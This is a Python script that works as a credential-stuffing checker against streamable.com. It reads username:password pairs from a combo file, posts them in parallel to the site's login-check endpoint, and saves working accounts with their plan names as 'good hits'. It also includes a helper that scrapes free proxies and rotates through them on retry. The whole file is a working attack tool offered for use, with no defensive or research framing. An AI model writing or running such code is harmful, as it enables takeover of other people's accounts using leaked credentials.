import datetime
import random
from concurrent.futures import ThreadPoolExecutor
import requests

# Get the current timestamp for logging purposes
x = datetime.datetime.now()

# Function to retrieve a list of proxies from an API
def get_proxies():
    url ='https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&country=all&anonymity=all&timeout=9200&proxy_format=ipport&format=text'
    r = requests.get(url).text.split()
    return r

# Initialize a global proxy list
proxy_list = get_proxies()

# Function to get a random proxy from the global proxy list
def get_random_proxy():
    return {
        "http": f"http://{random.choice(proxy_list)}",
        "https": f"https://{random.choice(proxy_list)}"
    }

# Function to make requests using a random proxy
def proxy_request(type, url, **kwargs):
    session = requests.session()
    while 1:
        try:
            proxy = get_random_proxy()
            r = session.request(type, url, proxies=proxy, timeout=5, **kwargs).json()
            # Break the loop if the request is successful
            break
        except:
            # Retry with a different proxy in case of an error
            pass
    return r

# Function to check a combination of username and password
def checker(combo):
    username = combo.split(":")[0]
    password = combo.split(":")[1]
    
    url = "https://ajax.streamable.com/check"
    post_data = {
        "username": username,
        "password": password
    }
    r = requests.post(url, json=post_data).json()
    
    # Check if the response contains "ad_tags" to determine success
    if "ad_tags" in r:
        print(f"[GOOD HIT] {username} : {password} Plan = {r['plan_name']}")
        write_to_file(username, password, r['plan_name'])
    else:
        print(f"[BAD HIT] {username} : {password}")

# Read combinations from a file
with open("combo.txt", "r") as file:
    combos = file.read().split()

# Function to write successful hits to a file
def write_to_file(username, password, account_type):
    open(f'Results\\[Good Hits] {x.strftime(" %d-%m-%y %I-%M-%S-%P ")}.txt', 'a').write(
        f"{username}:{password} Plan={account_type}"
    )

# Main function
def main():
    with ThreadPoolExecutor(max_workers=50) as executor:
        # Use ThreadPoolExecutor to parallelize the checker function for multiple combos
        try:
            futures = [executor.submit(checker, combo) for combo in combos]
            executor.shutdown(wait=True)
        except Exception as e:
            print(f'Error in ThreadPoolExecutor: {e}')
            pass

# Entry point of the script
if __name__ == '__main__':
    main()
# print(combos)
# checker('email@email.com:password')
# print(get_random_proxy())
